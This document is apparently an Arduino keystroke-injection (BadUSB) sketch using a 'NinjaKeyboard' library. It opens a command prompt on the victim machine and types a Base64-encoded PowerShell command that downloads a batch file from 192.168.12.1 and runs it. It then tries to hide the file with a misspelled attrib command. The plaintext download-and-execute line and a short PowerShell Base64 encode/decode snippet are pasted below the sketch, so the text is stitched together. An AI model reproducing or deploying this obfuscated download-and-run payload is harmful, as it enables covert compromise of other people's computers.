#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  en.winRUN("cmd.exe");
  en.echoEnter("powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAKADIALgAxAC8AYQAuAHQAeAB0ACcALAAnAGEALgBiAGEAdAAnACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJwBhAC4AYgBhAHQAJwA=");
  en.sleep(5);
  en.echoEnter("attrub +s +h a.bat");
  en.echoEnter("exit");
}

void loop() {
  
}
(New-Object System.Net.WebClient).DownloadFile('http://192.168.12.1/a.txt','a.bat');Start-Process 'a.bat'
  
      $Text = ‘This is a secret and should be hidden’
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    $EncodedText =[Convert]::ToBase64String($Bytes)
    $EncodedText

The result is this base64 encoded text:
VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A

Decoding:
Decoding the base64 encoded blob using PowerShell is simple.

    $EncodedText = “VABoAGkAcwAgAGkAcwAgAGEAIABzAGUAYwByAGUAdAAgAGEAbgBkACAAcwBoAG8AdQBsAGQAIABiAGUAIABoAGkAZABlAG4A”
    $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
    $DecodedText

 
